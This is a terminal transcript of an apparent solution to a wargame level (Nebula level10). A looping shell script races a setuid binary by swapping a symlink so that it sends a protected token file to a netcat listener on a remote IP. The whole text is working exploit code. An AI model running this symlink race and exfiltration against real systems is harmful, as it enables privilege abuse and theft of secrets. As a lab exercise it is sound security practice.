level10@nebula:~$ cat fast.sh
#!/bin/sh

while :
do
    rm -f token
    touch token
        /home/flag10/flag10 token 192.168.32.115 &
    ln -sf /home/flag10/token token
done

level10@nebula:~$ chmod +x fast.sh


on server:
$ nc -k -l 18211 | grep -v ".oO Oo."

then:
level10@nebula:~$ ./fast.sh

